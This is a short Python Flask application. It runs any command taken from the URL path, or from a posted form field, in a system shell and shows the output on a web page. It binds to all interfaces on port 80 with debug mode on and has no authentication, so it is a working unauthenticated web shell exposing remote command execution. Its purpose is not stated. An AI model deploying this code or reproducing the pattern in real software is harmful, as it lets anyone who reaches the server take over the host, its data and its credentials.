from flask import *
import os
import subprocess


app = Flask(__name__)


@app.route("/<path:command>")
@app.route("/")
def home(command = None):

    msg = None
    if command:
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        msg = p.communicate()[0]
        msg = msg.split(b"\n")

    return render_template("index2.html", command = command, msg = msg)

@app.route('/add', methods = ["POST"])
def add():
    command = request.form['post']
    return redirect(url_for("home", command = command))

app.run(host='0.0.0.0', port=80, debug=True)
